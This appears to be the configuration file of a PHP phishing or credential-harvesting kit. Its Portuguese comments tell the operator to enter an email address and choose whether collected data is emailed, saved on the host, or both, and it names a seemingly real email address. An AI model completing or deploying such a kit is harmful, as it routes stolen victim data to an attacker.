<?php
$email  = "jhoolennonnmaresia@gmail.com"; // SEU EMAIL AQUI PATRAOZAOOOO :D~
$metodo = "ambas"; // Escolha um dos metodos abaixo.
// Escolha o METODO e envio. 
//Coloque "mail" pra enviar para o email. 
//Coloque "host" salvar no host. 
//Coloque "ambas" Para enviar pro email e salvar no host.
?>